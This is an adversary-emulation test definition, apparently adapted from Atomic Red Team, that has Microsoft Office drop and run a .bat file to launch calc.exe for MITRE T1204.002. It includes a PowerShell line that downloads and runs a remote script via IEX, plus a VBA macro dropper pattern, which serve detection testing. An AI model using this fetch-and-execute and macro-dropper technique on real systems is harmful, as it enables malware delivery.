api_version: "2.0"
name: Office launching .bat file from AppData
description: Microsoft Office creating then launching a .bat script from an AppData directory. The .bat file launches calc.exe when opened.
args:
    - name: bat_path
      type: string
      default: $("$env:temp\art1204.bat")
    - name: ms_product
      type: string
      default: Word
uuid: 9215ea92-1ded-41b7-9cd6-79f9a78397aa
mitre:
    tactics:
        - 'TA0002: Execution'
    techniques:
        - 'T1204: User Execution'
    subtechniques:
        - 'T1204.002: Malicious File'
requirements:
    platforms:
        - os: windows
steps:
    - name: office-launching-.bat-file-from-appdata
      inline: |
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
        $macrocode = "   Open `"{{.Args.bat_path}}`" For Output As #1`n   Write #1, `"calc.exe`"`n   Close #1`n   a = Shell(`"cmd.exe /c {{.Args.bat_path}} `", vbNormalFocus)`n"
        Invoke-MalDoc -macroCode $macrocode -officeProduct {{.Args.ms_product}}
      executor: powershell
      cleanup:
        inline: |
            Remove-Item {{.Args.bat_path}} -ErrorAction Ignore
            Get-Process | Where-Object { $_.MainModule.FileName -like "*calculator*" } | Stop-Process
        executor: powershell
